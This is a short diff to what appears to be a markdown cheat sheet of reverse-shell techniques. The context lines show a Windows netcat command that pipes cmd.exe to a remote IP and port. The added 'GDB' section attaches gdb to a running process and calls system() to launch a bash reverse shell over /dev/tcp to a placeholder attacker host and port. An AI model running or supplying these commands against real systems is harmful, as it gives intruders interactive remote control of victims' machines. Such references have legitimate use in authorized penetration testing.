@@ -166,7 +166,11 @@ rem Create a socket and connect to the remote machine
 c:\nc.exe -n %IP% %PORT% -e cmd.exe
 ```
 
-
+# GDB
+```bash
+gdb -p PID
+call (void)system("bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'")
+```
 
 
 
